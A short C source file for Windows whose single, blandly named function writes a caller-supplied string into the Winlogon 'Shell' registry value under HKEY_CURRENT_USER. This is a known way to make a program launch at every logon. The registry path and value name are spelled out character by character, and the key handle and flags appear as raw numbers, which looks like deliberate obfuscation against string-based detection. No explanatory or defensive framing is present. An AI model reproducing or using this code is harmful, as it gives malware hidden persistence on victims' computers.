#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v2(const char* p){
    HKEY k;
    char path[] = { 'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',' ','N','T','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','W','i','n','l','o','g','o','n',0 };
    char val[] = { 'S','h','e','l','l',0 };
    if (RegOpenKeyExA((HKEY)(ULONG_PTR)((signed int)0x80000001), path, 0, (1 << 1) | (1 << 2), &k) == 0) {
        int l = 0;
        while (*(p + l)) l++;
        RegSetValueExA(k, val, 0, 1, (const BYTE*)p, l);
        RegCloseKey(k);
    }
}